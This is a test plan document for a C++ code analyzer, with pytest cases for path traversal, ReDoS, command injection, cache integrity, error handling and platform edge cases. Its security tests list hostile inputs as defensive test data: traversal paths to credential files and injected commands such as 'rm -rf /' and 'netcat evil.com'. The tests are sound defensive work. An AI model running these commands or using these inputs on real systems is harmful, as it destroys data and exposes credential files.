# Test Plan: Security, Robustness, and Edge Cases (CRITICAL)

**Part of**: [Comprehensive Test Plan](./TEST_PLAN.md)

**Priority**: P0 (Critical) - P1 (High)  
**Total Tests**: 22 test functions covering 90+ identified gaps

This document covers critical security tests, data integrity, error handling, edge cases, and platform-specific tests.

---

## 10. Security, Robustness, and Edge Case Tests (Critical Gaps)

### REQ-SEC-1: Path Traversal and Injection Prevention

#### Test-SEC-1.1-5: Comprehensive Security Tests
- **Priority**: P0 (Critical)
- **Test File**: `tests/security/test_path_security.py`
- **Test Cases**:

```python
def test_comprehensive_path_traversal_attacks():
    """CRITICAL: Test all path traversal attack vectors"""
    analyzer = setup_test_analyzer()

    dangerous_paths = [
        "../../../etc/passwd",                     # Unix traversal
        "..\\..\\..\\windows\\system32\\config\\sam",  # Windows traversal
        "/etc/shadow",                             # Absolute Unix path
        "C:\\Windows\\System32\\config\\sam",      # Windows absolute
        "%2e%2e%2f%2e%2e%2f",                     # URL-encoded
        "....//....//etc/passwd",                  # Double-dot bypass
        "project/../../../etc/passwd",             # Mixed valid/invalid
        "\\\\server\\share\\sensitive",            # UNC path
        "file:///../../../etc/passwd",             # File URL scheme
    ]

    for path in dangerous_paths:
        result = analyzer.find_in_file(path, ".*")
        # Should either return empty, reject, or only return project files
        if isinstance(result, list):
            for item in result:
                file_path = item.get("file", "")
                # Must not access system files
                assert "/etc/" not in file_path
                assert "\\Windows\\System32\\" not in file_path.replace("/", "\\")

def test_regex_dos_prevention():
    """CRITICAL: Test protection against catastrophic backtracking"""
    analyzer = setup_test_analyzer()

    # Patterns known to cause catastrophic backtracking
    malicious_patterns = [
        "(a+)+b",           # Exponential backtracking
        "(a*)*b",           # Exponential backtracking
        "(a|a)*b",          # Exponential backtracking
        "(a|ab)*c",         # Exponential backtracking
        "([a-zA-Z]+)*d",    # Large character class repetition
    ]

    test_string = "a" * 30  # String that triggers backtracking

    import time
    for pattern in malicious_patterns:
        start = time.time()
        try:
            # Should timeout or handle gracefully
            results = analyzer.search_classes(pattern)
            elapsed = time.time() - start
            # Should complete within reasonable time (< 2 seconds)
            assert elapsed < 2.0, f"Pattern {pattern} took {elapsed}s (potential ReDoS)"
        except Exception as e:
            # Pattern rejection is acceptable
            assert "timeout" in str(e).lower() or "invalid" in str(e).lower()

def test_command_injection_prevention():
    """CRITICAL: Test compile_commands.json command injection prevention"""
    malicious_commands = [
        'clang++ file.cpp; rm -rf /',
        'clang++ $(malicious_command) file.cpp',
        'clang++ `backdoor` file.cpp',
        'clang++ file.cpp & netcat evil.com',
        'clang++ file.cpp | sh malicious.sh',
    ]

    for cmd in malicious_commands:
        cc_data = [{
            "directory": "/project",
            "file": "/project/test.cpp",
            "command": cmd
        }]

        with temp_compile_commands(cc_data) as cc_path:
            manager = CompileCommandsManager(cc_path.parent, {})
            args = manager.get_compile_args(Path("/project/test.cpp"))

            # Commands should be parsed for flags only, never executed
            # Verify no shell metacharacters in final args
            for arg in args:
                assert ";" not in arg
                assert "|" not in arg
                assert "&" not in arg
                assert "$(" not in arg
                assert "`" not in arg

def test_symlink_attack_prevention():
    """CRITICAL: Test symlink attack prevention"""
    with temp_project() as project:
        # Create symlink to sensitive file
        sensitive_file = "/etc/passwd"
        if os.path.exists(sensitive_file):
            symlink_path = project / "evil_symlink.cpp"
            try:
                os.symlink(sensitive_file, symlink_path)

                analyzer = CppAnalyzer(project)
                analyzer.index_project()

                # Should not index content from outside project
                results = analyzer.search_symbols(".*")
                # No symbols from /etc/passwd should be indexed
                assert len(results["classes"]) == 0
                assert len(results["functions"]) == 0
            except (OSError, PermissionError):
                # Platform doesn't support symlinks
                pass

def test_malicious_config_values():
    """HIGH: Test validation of malicious configuration values"""
    malicious_configs = [
        {"max_file_size_mb": 999999999},          # Integer overflow attempt
        {"max_file_size_mb": -1},                  # Negative value
        {"exclude_directories": ["../../../"]},    # Path traversal in config
        {"diagnostics": {"level": "'; DROP TABLE"}},  # Injection attempt
    ]

    for config_data in malicious_configs:
        with temp_config_file(json.dumps(config_data)) as config_path:
            try:
                config = CppAnalyzerConfig(config_path.parent)
                # Should have safe defaults or validation
                assert config.max_file_size_mb >= 0
                assert config.max_file_size_mb <= 1000  # Reasonable limit
            except (ValueError, ValidationError):
                # Explicit rejection is acceptable
                pass
```

### REQ-ROB-1: Data Integrity and Atomic Operations

#### Test-ROB-1.1-4: Cache and Data Integrity
- **Priority**: P0 (Critical)
- **Test File**: `tests/robustness/test_data_integrity.py`
- **Test Cases**:

```python
def test_atomic_cache_writes():
    """CRITICAL: Verify cache writes are atomic (no partial files)"""
    with temp_project() as project:
        analyzer = CppAnalyzer(project)
        analyzer.index_project()

        cache_dir = analyzer.cache_manager.cache_dir
        cache_file = cache_dir / "cache_info.json"

        assert cache_file.exists()

        # Simulate crash during write by checking for .tmp files
        # Proper atomic write: write to .tmp, then rename
        tmp_files = list(cache_dir.glob("*.tmp"))
        # Should clean up temp files after successful write
        assert len(tmp_files) == 0

def test_malformed_json_cache_recovery():
    """CRITICAL: Test recovery from corrupt cache files"""
    with temp_project() as project:
        analyzer1 = CppAnalyzer(project)
        analyzer1.index_project()

        cache_file = analyzer1.cache_manager.cache_dir / "cache_info.json"

        # Corrupt cache with various malformations
        corruptions = [
            b'{"incomplete": ',              # Truncated JSON
            b'{"valid": "json"}\x00\x00',   # Null bytes
            b'\xff\xfe' + b'invalid',        # Invalid UTF-8
            b'<html>not json</html>',        # Wrong format
        ]

        for corrupt_data in corruptions:
            with open(cache_file, 'wb') as f:
                f.write(corrupt_data)

            # Should recover by rebuilding cache
            analyzer2 = CppAnalyzer(project)
            cache_loaded = analyzer2._load_cache()

            # Either rejects corrupt cache or loads valid parts
            assert cache_loaded == False or analyzer2.get_stats()["file_count"] >= 0

def test_cache_consistency_after_interrupt():
    """HIGH: Test cache consistency after interrupted indexing"""
    with temp_project(num_files=20) as project:
        analyzer = CppAnalyzer(project)

        # Simulate interrupted indexing
        # Index partially then mark as interrupted
        analyzer.cache_manager.save_progress(
            total_files=20,
            indexed_files=10,
            failed_files=0,
            cache_hits=0,
            last_index_time=1.0,
            class_count=5,
            function_count=15,
            status="interrupted"
        )

        # On restart, should detect interrupted state
        analyzer2 = CppAnalyzer(project)
        progress = analyzer2.cache_manager.load_progress()

        assert progress["status"] == "interrupted"

        # Should successfully complete indexing
        count = analyzer2.index_project()
        assert count > 0

        # Final status should be complete
        final_progress = analyzer2.cache_manager.load_progress()
        assert final_progress["status"] == "complete"

def test_concurrent_cache_write_protection():
    """HIGH: Test protection against concurrent cache corruption"""
    with temp_project() as project:
        # Two analyzers for same project
        analyzer1 = CppAnalyzer(project)
        analyzer2 = CppAnalyzer(project)

        import threading
        errors = []

        def index_project(analyzer, errors_list):
            try:
                analyzer.index_project()
            except Exception as e:
                errors_list.append(e)

        # Index concurrently
        thread1 = threading.Thread(target=index_project, args=(analyzer1, errors))
        thread2 = threading.Thread(target=index_project, args=(analyzer2, errors))

        thread1.start()
        thread2.start()
        thread1.join()
        thread2.join()

        # At most one should fail due to locking
        # Both should not corrupt the cache
        cache_file = analyzer1.cache_manager.cache_dir / "cache_info.json"
        assert cache_file.exists()

        # Cache should be loadable
        with open(cache_file) as f:
            data = json.load(f)  # Should not raise JSON decode error
            assert "class_index" in data
```

### REQ-ERR-1: Error Handling and Resilience

#### Test-ERR-1.1-6: Comprehensive Error Handling
- **Priority**: P0-P1 (Critical-High)
- **Test File**: `tests/robustness/test_error_handling.py`
- **Test Cases**:

```python
def test_file_permission_errors():
    """HIGH: Test handling of file permission errors"""
    with temp_project() as project:
        test_file = project / "test.cpp"
        test_file.write_text("class Test {};")

        # Make file unreadable
        import stat
        os.chmod(test_file, 0o000)

        try:
            analyzer = CppAnalyzer(project)
            count = analyzer.index_project()

            # Should continue with other files
            assert isinstance(count, int)

            # Check that error was logged
            # (Implementation-dependent)
        finally:
            # Cleanup: restore permissions
            os.chmod(test_file, stat.S_IRUSR | stat.S_IWUSR)

def test_disk_full_during_cache_write():
    """HIGH: Test handling of disk full errors"""
    with temp_project() as project:
        analyzer = CppAnalyzer(project)
        analyzer.index_project()

        # Mock disk full error
        original_save = analyzer.cache_manager.save_cache

        def mock_save_disk_full(*args, **kwargs):
            raise OSError(28, "No space left on device")  # ENOSPC

        analyzer.cache_manager.save_cache = mock_save_disk_full

        # Should handle gracefully
        try:
            analyzer.refresh_if_needed()
            # Should continue in-memory even if cache fails
            assert analyzer.get_stats()["class_count"] >= 0
        except OSError as e:
            # Explicit error is acceptable
            assert "space" in str(e).lower()

def test_corrupt_compile_commands_handling():
    """HIGH: Test handling of malformed compile_commands.json"""
    corruptions = [
        '{invalid json',                    # Syntax error
        '{"directory": "missing file"}',    # Missing required fields
        '[{"malformed": }]',                # Invalid structure
        'null',                             # Wrong type
        '[]',                               # Empty but valid
    ]

    for corrupt_json in corruptions:
        with temp_project() as project:
            cc_path = project / "compile_commands.json"
            cc_path.write_text(corrupt_json)

            # Should fall back to hardcoded args
            analyzer = CppAnalyzer(project)
            assert analyzer.compile_commands_manager is not None

            # Should still be able to index
            count = analyzer.index_project()
            assert isinstance(count, int)

def test_empty_and_whitespace_files():
    """MEDIUM: Test handling of empty and whitespace-only files"""
    with temp_project() as project:
        # Empty file
        empty_file = project / "empty.cpp"
        empty_file.write_text("")

        # Whitespace only
        whitespace_file = project / "whitespace.cpp"
        whitespace_file.write_text("   \n\t\n   ")

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # Should handle without errors
        assert count >= 0

        # No symbols extracted
        stats = analyzer.get_stats()
        # May or may not index empty files (implementation-dependent)

def test_null_bytes_in_source():
    """MEDIUM: Test handling of null bytes in source files"""
    with temp_project() as project:
        bad_file = project / "nullbytes.cpp"
        bad_file.write_bytes(b"class Test {\x00 void method(); };")

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # Should handle gracefully (skip or parse around null bytes)
        assert isinstance(count, int)

def test_extremely_long_symbol_names():
    """MEDIUM: Test handling of very long symbol names"""
    with temp_project() as project:
        long_name = "A" * 5000
        source = project / "long.cpp"
        source.write_text(f"class {long_name} {{}};")

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # Should handle without truncation or error
        results = analyzer.search_classes(long_name)
        assert len(results) >= 0  # May or may not find based on limits
```

### REQ-EDGE-1: Boundary Conditions and Edge Cases

#### Test-EDGE-1.1-4: Edge Case Coverage
- **Priority**: P1-P2 (High-Medium)
- **Test File**: `tests/edge_cases/test_boundaries.py`
- **Test Cases**:

```python
def test_file_size_boundary_conditions():
    """HIGH: Test exact file size limits"""
    with temp_project() as project:
        default_limit_mb = 10
        limit_bytes = default_limit_mb * 1024 * 1024

        # Just under limit (should index)
        under_limit = project / "under.cpp"
        under_limit.write_text("// " + "x" * (limit_bytes - 100))

        # At exact limit (boundary)
        at_limit = project / "at.cpp"
        at_limit.write_text("// " + "x" * limit_bytes)

        # Just over limit (should skip)
        over_limit = project / "over.cpp"
        over_limit.write_text("// " + "x" * (limit_bytes + 100))

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # Verify consistent boundary behavior
        file_index = analyzer.file_index
        # Implementation-dependent: which files are indexed

def test_maximum_inheritance_depth():
    """HIGH: Test very deep inheritance hierarchies"""
    with temp_project() as project:
        # Create 100-level deep inheritance
        depth = 100
        source = project / "deep.cpp"

        code = []
        for i in range(depth):
            if i == 0:
                code.append(f"class Base{i} {{}};")
            else:
                code.append(f"class Derived{i} : public Base{i-1} {{}};")

        source.write_text("\n".join(code))

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # Should handle without stack overflow
        assert count > 0

        # Hierarchy queries should work
        hierarchy = analyzer.get_class_hierarchy(f"Derived{depth-1}")
        assert hierarchy is not None

def test_many_function_overloads():
    """MEDIUM: Test functions with many overloads"""
    with temp_project() as project:
        source = project / "overloads.cpp"

        overloads = []
        for i in range(50):
            overloads.append(f"void overloaded(int arg{i}) {{}}")

        source.write_text("\n".join(overloads))

        analyzer = CppAnalyzer(project)
        count = analyzer.index_project()

        # All overloads should be indexed
        results = analyzer.search_functions("overloaded")
        assert len(results) == 50

        # All should have unique signatures
        sigs = [r["signature"] for r in results]
        assert len(set(sigs)) == 50

def test_concurrent_file_modification():
    """HIGH: Test file modification during parsing"""
    with temp_project() as project:
        test_file = project / "modifying.cpp"
        test_file.write_text("class Original {};")

        analyzer = CppAnalyzer(project)

        # Start indexing in thread
        import threading
        def index_project():
            analyzer.index_project()

        thread = threading.Thread(target=index_project)
        thread.start()

        # Modify file during indexing
        import time
        time.sleep(0.1)
        test_file.write_text("class Modified {};")

        thread.join()

        # Should complete without crash
        stats = analyzer.get_stats()
        assert stats["file_count"] >= 0
```

### REQ-PLAT-1: Platform-Specific Tests

#### Test-PLAT-1.1-3: Platform Compatibility
- **Priority**: P1 (High)
- **Test File**: `tests/platform/test_platform_specific.py`
- **Test Cases**:

```python
@pytest.mark.skipif(sys.platform == "win32", reason="Unix-specific")
def test_unix_file_permissions():
    """HIGH: Test Unix file permission handling"""
    with temp_project() as project:
        # File with restricted permissions
        restricted = project / "restricted.cpp"
        restricted.write_text("class Test {};")
        os.chmod(restricted, 0o000)

        analyzer = CppAnalyzer(project)
        try:
            count = analyzer.index_project()
            # Should skip inaccessible file
        finally:
            os.chmod(restricted, 0o644)

@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
def test_windows_path_separators():
    """HIGH: Test Windows path separator handling"""
    with temp_project() as project:
        cc_data = [{
            "directory": "C:\\project",
            "file": "C:/project/mixed\\separators.cpp",  # Mixed separators
            "command": "clang++ mixed\\separators.cpp"
        }]

        with temp_compile_commands(cc_data) as cc_path:
            manager = CompileCommandsManager(cc_path.parent, {})
            # Should normalize paths correctly
            args = manager.get_compile_args(Path("C:/project/mixed/separators.cpp"))
            assert args is not None

@pytest.mark.skipif(sys.platform != "win32", reason="Windows-specific")
def test_windows_max_path_length():
    """HIGH: Test handling of Windows MAX_PATH (260 char) limit"""
    with temp_project() as project:
        # Create deeply nested path approaching limit
        deep_path = project
        for i in range(20):
            deep_path = deep_path / f"level{i}"
        deep_path.mkdir(parents=True, exist_ok=True)

        long_file = deep_path / "file.cpp"
        if len(str(long_file)) > 260:
            # Test handling of path over limit
            try:
                long_file.write_text("class Test {};")
                analyzer = CppAnalyzer(project)
                count = analyzer.index_project()
                # Should use long path API or handle gracefully
                assert isinstance(count, int)
            except OSError as e:
                # Acceptable to fail with clear error on old Windows
                pass
```

---

